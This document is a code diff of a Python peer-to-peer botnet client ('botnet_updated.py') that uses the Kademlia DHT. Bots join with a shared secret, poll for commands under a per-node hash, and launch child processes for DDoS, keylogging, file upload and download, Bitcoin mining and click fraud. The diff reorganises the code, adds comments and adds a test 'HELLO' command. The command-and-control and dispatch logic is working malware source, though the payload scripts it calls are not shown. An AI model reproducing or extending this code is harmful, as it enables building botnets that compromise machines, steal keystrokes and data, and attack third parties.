@@ -1,11 +1,13 @@
 import logging, sys, pdb
 import asyncio, subprocess, hashlib, socket
-from asyncio.tasks import ensure_future
+#from asyncio.tasks import ensure_future
 from kademlia.network import Server
 from collections import Counter
 
+#Network Secret, allows nodes to join same Network
 SECRET="TheSecretKey"
 
+#Setup logging
 handler = logging.StreamHandler()
 formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 handler.setFormatter(formatter)
@@ -14,33 +16,15 @@ log.addHandler(handler)
 log.setLevel(logging.DEBUG)
 
 
-loop = asyncio.get_event_loop()
-loop.set_debug(True)   
-
 if len(sys.argv) != 4:
     print("Usage: python botnet_updated.py <bootstrap ip> <bootstrap port> <bot port>")
     exit(0)
-bootstrap_ip = str(sys.argv[1])
-port = int(sys.argv[2])
-myport = int(sys.argv[3])
 
-class botnode:
-    def __init__(self, ip, port, network_id, cmdhash):
-        self.ip = ip
-        self.port = port
-        self.id = network_id
-        self.cmdcnt = 0
-        # this will store all the child processes that are started
-        self.pgroup = []
-        self.cmdsrun = {'DDOS': False, 'SHELL': False, 'DOWNLOAD': False,
-                        'KEYLOG': False, 'UPLOAD': False, 'BITCOIN': False,
-                        'CLICKFRAUD': False}
-        # This is the hash of this node's bot ID (Will be used when commander looks up machines to send CMDs)
-        self.cmdkey = cmdhash
-
+#Helper functions
 def get_ip_address():
     #NOTE: This would be LAN IP and not WAN IP, can adjust code to reflect change if needed
     ## Attempts to Connects to WAN and gets ip address of socket that connected
+    ##TODO: Allow bot to communicte with V6 or V4 Addresses
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect(("1.1.1.1", 80))
     return s.getsockname()[0]
@@ -54,12 +38,34 @@ def most_common(list):
     data = Counter(list)
     return data.most_common(1)[0][0]
 
+#Botclass that holds network, and bot information
+class botnode:
+    def __init__(self, ip, port, network_id, cmdhash):
+        self.ip = ip
+        self.port = port
+        self.id = network_id
+        self.cmdcnt = 0
+        # this will store all the child processes that are started
+        self.pgroup = []
+        self.cmdsrun = {'DDOS': False, 'SHELL': False, 'DOWNLOAD': False,
+                        'KEYLOG': False, 'UPLOAD': False, 'BITCOIN': False,
+                        'CLICKFRAUD': False, 'HELLO':False}
+        # This is the hash of this node's bot ID (Will be used when commander looks up machines to send CMDs)
+        self.cmdkey = cmdhash
+
+"""
+Query Value returned from cmdkey
+If command has not been ran then spawn a child process, and run the command.
+Block the command from being run again.
+Return to wait_cmd() loop and check for new commands
+"""
 async def get_cmd(value, server, bot):
     commands = ['DDOS', 'DOWNLOAD', 'KEYLOG', 'UPLOAD', 'BITCOIN', 'CLICKFRAUD']
     try:
         x = value.split()
         cnt = int(x[0])  # parse out the command count
         cmd = x[1]
+        print("\nCMD TO RUN {}\n".format(cmd))
         if cmd in commands and cnt > bot.cmdcnt:
             bot.cmdcnt += 1
             if cmd == 'KEYLOG':
@@ -92,13 +98,20 @@ async def get_cmd(value, server, bot):
                 tmp = 'python clickFraud.py {0}'.format(' '.join(x[1:]))
                 print("Starting CLICKFRAUD on {0}".format(tmp))
                 process = subprocess.Popen(tmp.split(), shell=False)
+            if cmd == 'HELLO':
+                tmp = 'python sayHello.py {0}'.format(' '.join(x[1:]))
+                print("Starting Hello program on {0}".format(tmp))
+                process = subprocess.Popen(tmp.split(),shell=False)
     except Exception as e:
         pass
     #pdb.set_trace()
     await wait_cmd(server, bot)
 
-"""
 
+"""
+Query the network for any store requests with the cmdkey of our node
+While there is no command, wait 5 seconds, then check again
+If command is found, break out, then run get_cmd()
 """
 async def wait_cmd(server, bot):
     print("Checking for command")
@@ -107,8 +120,6 @@ async def wait_cmd(server, bot):
     while checkCommands is None and numcalls < 5: #set max calls to 5 for debugging 
         print("\nNO COMMAND FOR ME WAITING")
         checkCommands = await server.get(bot.cmdkey)
-        #might need to create new key for each bot to listen for. 
-        #loop.call_soon_threadsafe(get_cmd(server.get(bot.cmdkey), server,bot)) #.addCallback(get_cmd, server, bot))
         await asyncio.sleep(5)
         numcalls+=1
     print("\nFound a command for nodeID {}\n\n".format(checkCommands))
@@ -127,9 +138,10 @@ async def callhome(server, bot):
     if nodeId != str(bot.id) or nodeId is None:
         print("No ack for {}".format(nodeId))
         await server.set(NETKEY, str(bot.id))
+        await asyncio.sleep(5)
         await callhome(server,bot)
     else:    
-        print("We have an ack Node: {} has joined {}\n\n"
+        print("\nWe have an ack\nNode: {} has joined {}\n\n"
         .format(nodeId,NETKEY))
         await wait_cmd(server,bot)
 
@@ -146,7 +158,7 @@ async def setup(server):
     myip = get_ip_address()
     cmdhash = get_hash(str(server.node.long_id))
     #Create botnode with Its IP, Port, Bot ID, and command hash
-    bot = botnode(myip, port, str(server.node.long_id), cmdhash)
+    bot = botnode(myip, myport, str(server.node.long_id), cmdhash)
 
     print("\nParams: NETWORK_KEY {}\nIP: {}\nNODE_ID: {}\nCOMMAND KEY: {}"
         .format(NETKEY, myip, server.node.long_id, cmdhash))
@@ -156,26 +168,30 @@ async def setup(server):
 
 
 ### IF check does nothing server returning NoneType, bc Node has not yet joined network. 
-## Useless function? Might remove, since we are calling setup directly when loop starts. 
 async def bootstrapDone(server):
     result = await server.get(NETKEY) #keyhash - Might need to pass in keyhash instead. 
     if result is None:
         server.stop()
+        loop.close()
         print("\nKey is: ",result, "\n\nBootstrapper down: machine has not joined network\n")
     print("\nAble to fetch key as result:",result, type(result))
     
-    
 
+#SERVER ACTUALLY STARTS HERE
+bootstrap_ip = str(sys.argv[1])
+bootstrap_port = int(sys.argv[2])
+myport = int(sys.argv[3])
 
-
-#SERVER ACTUALLY STARTS HERE*****************************************
-server = Server()
 #### KEY TO JOIN NETWORK ####
-#key = hashlib.sha1()
-#key.update(SECRET.encode('utf-8'))
-NETKEY = get_hash(SECRET) #NETKEY Allows bot to bootstrap onto network. 
+NETKEY = get_hash(SECRET)
+
+#Init Asyncio event loop
+loop = asyncio.get_event_loop()
+loop.set_debug(True)  
+
+server = Server()
 loop.run_until_complete(server.listen(myport))
-loop.run_until_complete(server.bootstrap([(bootstrap_ip, port)]))
+loop.run_until_complete(server.bootstrap([(bootstrap_ip, bootstrap_port)]))
 #loop.run_until_complete(bootstrapDone(server, key))
 pdb.set_trace()
 try:
